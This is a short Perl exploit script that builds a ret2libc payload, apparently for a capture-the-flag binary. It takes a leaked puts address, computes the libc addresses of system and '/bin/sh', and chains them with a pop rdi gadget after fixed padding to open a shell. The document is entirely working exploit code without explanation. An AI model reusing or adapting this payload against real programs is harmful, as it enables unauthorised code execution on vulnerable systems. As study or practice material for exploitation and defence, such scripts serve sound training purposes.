#!/usr/bin/perl

use strict;
use warnings;

if (@ARGV != 1) {
	use File::Basename;
	my $name = basename($0, "");
	die "Usage: perl $name puts_actual\n";
}

my $puts_actual = hex($ARGV[0]);

my $puts_file = 0x00000000000765f0;
my $system_file = 0x0000000000048e50;
my $binsh_file = 0x18A152;

my $pop_rdi = pack("Q", 0x40155b);
my $ret = pack("Q", 0x40155c);

my $payload = "mikenekomofumofu" . "mikenekomofumofu" . "mikeneko";
$payload .= $pop_rdi;
$payload .= pack("Q", $binsh_file + $puts_actual - $puts_file);
$payload .= $ret;
if (1) {
	# call system
	$payload .= pack("Q", $system_file + $puts_actual - $puts_file);
} else {
	# call puts (for debug)
	$payload .= pack("Q", 0x401030);
}

binmode(STDOUT);
print $payload;
print "\n";
